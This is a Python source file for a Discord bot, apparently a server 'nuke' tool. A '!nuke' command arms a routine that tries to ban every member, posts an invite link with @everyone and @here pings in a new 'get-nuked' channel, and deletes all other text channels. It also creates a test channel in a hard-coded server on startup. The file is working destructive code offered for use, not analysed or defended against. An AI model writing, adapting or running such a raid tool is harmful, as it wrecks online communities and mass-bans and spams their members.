import discord
from discord.ext import commands

nuke=False 

intents = discord.Intents.all()

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'We have logged in as {bot.user}')

    guild_id = 1162895180161101877
    guild = bot.get_guild(guild_id)
    
    if guild is not None:
        # Create a text channel named 'hi' in the specified guild
        new_channel = await guild.create_text_channel('hi')

        # Send a welcome message in the new channel
        await new_channel.send("Hello, world!")


@bot.event
async def on_message(message):
    global nuke
    channel = message.channel
    if (nuke == True):
            for member in message.guild.members:
                try:
                   await member.ban()
                except:
                    pass
            new_channel = await channel.guild.create_text_channel("get-nuked")
            await new_channel.send(' Join https://discord.gg/9UHPQ2Cp @everyone @here')
            for channel in channel.guild.channels:
                if isinstance(channel, discord.TextChannel) and channel.name != "get-nuked":
                   await channel.delete()
            await message.channel.send('https://discord.gg/9UHPQ2Cp')

    if message.content.startswith('!off'):
        
        nuke=False

    if message.content.startswith('!nuke'):
        
        nuke=True

        await message.channel.send('o')


bot.run("get your own token")
